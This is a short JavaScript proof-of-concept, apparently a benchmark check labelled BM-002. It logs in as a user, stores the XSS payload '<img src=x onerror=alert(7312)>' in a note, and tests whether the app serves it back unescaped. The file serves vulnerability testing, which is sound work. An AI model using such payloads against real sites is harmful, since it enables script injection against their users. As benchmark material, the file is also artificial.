'use strict';

const poc = require('./lib/common');

// BM-002: stored XSS through /notes.
poc.run(async function () {
  const token = await poc.login('alice');
  const payload = '<img src=x onerror=alert(7312)>';
  const created = await poc.request('POST', '/notes', { headers: poc.bearer(token), body: { title: 'poc', body: payload } });
  poc.control(created.status === 201, 'note creation');
  const page = await poc.request('GET', '/notes/' + JSON.parse(created.body).id);
  poc.finish(page.body.includes(payload), 'stored payload ' + (page.body.includes(payload) ? 'served raw' : 'not served raw'));
});
